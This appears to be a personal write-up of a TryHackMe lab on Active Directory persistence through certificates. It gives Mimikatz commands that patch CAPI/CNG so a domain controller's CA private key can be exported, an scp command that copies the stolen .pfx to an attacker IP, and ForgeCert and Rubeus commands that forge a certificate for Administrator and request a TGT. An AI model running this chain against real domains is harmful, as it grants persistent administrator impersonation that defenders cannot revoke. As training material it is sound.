# Persistence through Certificates

In the Exploiting AD room, we leveraged certificates to become Domain Admins. However, certificates can also be used for persistence. All we need is a valid certificate that can be used for Client Authentication.&#x20;

This will allow us to use the certificate to request a TGT. The beauty of this? We can continue requesting TGTs no matter how many rotations they do on the account we are attacking. The only way we can be kicked out is if they revoke the certificate we generated or if it expires. Meaning we probably have persistent access by default for roughly the next 5 years.

Depending on our access, we can take it another step further. We could simply steal the private key of the root **Cerificate Authority (CA)**'s certificate to generate our own certificates whenever we feel like it. Even worse, since these certificates were never issued by the CA, the blue team has no ability to revoke them.

***

### <mark style="color:green;">Extracting the Private Key</mark>

If the CA’s private key isn’t protected by hardware like an Hardware Security Module (HSM), it’s stored on the CA server and secured using <mark style="color:red;">Windows' Data Protection API (DPAPI)</mark>. This means attackers can use tools like Mimikatz or SharpDPAPI to extract the CA certificate and private key.

View certificates stored on the DC:

```powershell
mimikatz.exe
mimikatz # crypto::certificates /systemstore:local_machine
```

<figure><img src="../../../.gitbook/assets/image (660).png" alt=""><figcaption></figcaption></figure>

We can see that there is a CA certificate on the DC. We can also note that some of these certificates were set not to allow us to export the key. Without this private key, we would not be able to generate new certificates. Luckily, Mimikatz allows us to patch memory to make these keys exportable:

```powershell
mimikatz # privilege::debug
mimikatz # crypto::capi
mimikatz # crypto::cng
```

<figure><img src="../../../.gitbook/assets/image (661).png" alt=""><figcaption></figcaption></figure>

With these services patched, we can use Mimikatz to export the certificates:

```powershell
mimikatz # crypto::certificates /systemstore:local_machine /export
```

<figure><img src="../../../.gitbook/assets/image (662).png" alt=""><figcaption></figcaption></figure>

The exported certificates will be stored in both PFX and DER format to disk:

<figure><img src="../../../.gitbook/assets/image (663).png" alt=""><figcaption></figcaption></figure>

We are interested in the `.pfx` certificate because it contains the private key. In order to export the private key, a password must be used to encrypt the certificate. By default, Mimikatz assigns the password of `mimikatz`

Transfer the private key to low privileged user's home directory on THMWRK1 use scp.

Copy it to attacker's machine first

```
scp local_machine_My_0_.pfx <USER>@<ATTACKER_IP>:/home/<USER>
```

Then transfer it to THMWRK1's low privileged user

```bash
scp local_machine_My_0_.pfx <USER>@<VICTIM_IP>:\C:\Users\<USER>\local_machine_My_0_.pfx
```

<figure><img src="../../../.gitbook/assets/image (664).png" alt=""><figcaption></figcaption></figure>

***

### <mark style="color:green;">Generating our own Certificates</mark>

Now that we have the private key and root CA certificate, we can use `ForgeCert` tool to forge a Client Authenticate certificate for any user we want.&#x20;

```powershell
ForgeCert.exe --CaCertPath za-THMDC-CA.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath fullAdmin.pfx --NewCertPassword Password123 
```

* <mark style="background-color:orange;">**CaCertPath**</mark> - The path to our exported CA certificate.
* <mark style="background-color:orange;">**CaCertPassword**</mark> - The password used to encrypt the certificate. By default, Mimikatz assigns the password of `mimikatz`.
* <mark style="background-color:orange;">**Subject**</mark> - The subject or common name of the certificate. This does not really matter in the context of what we will be using the certificate for.
* <mark style="background-color:orange;">**SubjectAltName**</mark> - This is the User Principal Name (UPN) of the account we want to impersonate with this certificate. It has to be a legitimate user.
* <mark style="background-color:orange;">**NewCertPath**</mark> - The path to where ForgeCert will store the generated certificate.
* <mark style="background-color:orange;">**NewCertPassword**</mark> - Since the certificate will require the private key exported for authentication purposes, we must set a new password used to encrypt it.

<figure><img src="../../../.gitbook/assets/image (666).png" alt=""><figcaption></figcaption></figure>

Now, we can use Rubeus to request a TGT using the certificate to verify that the certificate is trusted.

```powershell
C:\Tools\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:<path to certificate> /password:<certificate file password> /outfile:<name of file to write TGT to> /domain:za.tryhackme.loc /dc:<IP of domain controller>
```

( I didn't know why it didnt trust the client and didnt work but it should come out like this and generated our TGT)

<figure><img src="../../../.gitbook/assets/image (668).png" alt=""><figcaption></figcaption></figure>

and then use Mimikatz to load the TGT and authenticate to THMDC:

<figure><img src="../../../.gitbook/assets/image (669).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (670).png" alt=""><figcaption></figcaption></figure>

